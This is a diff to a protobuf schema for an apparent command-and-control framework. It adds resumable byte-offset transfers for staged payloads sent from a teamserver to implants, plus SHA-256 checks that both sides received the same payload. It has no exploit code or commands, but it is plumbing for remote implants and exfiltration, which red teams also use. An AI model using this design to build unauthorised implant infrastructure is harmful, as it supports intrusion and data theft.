@@ -121,23 +121,45 @@ message ExfilChunk {
 // implant that does not implement staged uploads never receives a chunk frame
 // (architecture.md Sec 10, the per-verb typed arm; extending/implants.md Tier
 // 2).
+//
+// offset and prefix_sha256 are the byte-offset resume arm (architecture.md
+// Sec 15.3, ADR-010), sent only by an implant that already holds part of the
+// payload from an interrupted run: offset names the byte count held, and
+// prefix_sha256 is the SHA-256 of exactly those bytes -- the proof that lets
+// the server answer from the seam instead of restarting. A demand with no
+// offset is the fresh shape every staged-capable implant can send, and a
+// resume the server cannot honor (a prefix that does not match, an offset
+// past the payload) is answered as the fresh shape: the run's first chunk
+// carries offset 0, and a resuming implant resets its held bytes on it.
 message StagedPull {
   string task_id = 1;
+  optional uint64 offset = 2;
+  optional bytes prefix_sha256 = 3;
 }
 
 // One chunk of a staged payload the teamserver streams downstream in answer
 // to a StagedPull: the mirror of ExfilChunk in the other direction. task_id
-// echoes the demanded task; sequence is the 0-origin chunk index; terminal
-// marks the last chunk (a demand whose task holds no staged payload is
-// answered with a single empty terminal chunk, so a demanding implant always
-// resolves rather than hangs). Payload integrity is bound to the signed task
+// echoes the demanded task; sequence is the run's 0-origin chunk index;
+// terminal marks the last chunk (a demand whose task holds no staged payload
+// is answered with a single empty terminal chunk, so a demanding implant
+// always resolves rather than hangs). Payload integrity is bound to the signed task
 // by the sha256 token the issuer appends to the task's arguments -- the
 // chunks themselves carry no signature of their own.
+//
+// offset (ADR-010) is the chunk data's absolute byte position within the
+// staged payload, set by every server that knows the field: a fresh run
+// starts at 0, a resumed run starts where the honored demand's offset named,
+// and the receiving implant places the bytes at that position -- a duplicate
+// write is idempotent, and a first chunk at offset 0 tells a resuming implant
+// the server restarted the transfer whole. Older staged-capable implants
+// ignore the unknown field and concatenate by arrival order, which a fresh
+// run satisfies exactly.
 message StagedChunk {
   string task_id = 1;
   uint64 sequence = 2;
   bool terminal = 3;
   bytes data = 4;
+  optional uint64 offset = 5;
 }
 
 // One chunk of a live task channel's output, sent upstream as kind
@@ -433,10 +455,19 @@ enum TaskOutcome {
 // The implant's result for a task: the echoed task_id, the outcome, and the
 // captured output (stdout/stderr or equivalent). Carried even on failure so the
 // server captures the cause.
+//
+// payload_sha256 (ADR-010) is the both-side verification half for a staged
+// task: the hex SHA-256 of the reassembled payload the implant acted on, set
+// by staged-capable implants on the staged verbs' results (success and
+// mismatch failure alike -- a mismatch names what actually arrived). The
+// server compares it against the staged artifact it served, so a task only
+// records Succeeded when both sides hold the same bytes. Absent on every
+// other result; no implant that never sets it changes behavior.
 message TaskResult {
   string task_id = 1;
   TaskOutcome outcome = 2;
   string output = 3;
+  optional string payload_sha256 = 4;
 }
 
 // Implant-initiated beacon channel (architecture.md Sec.5/8). The implant opens
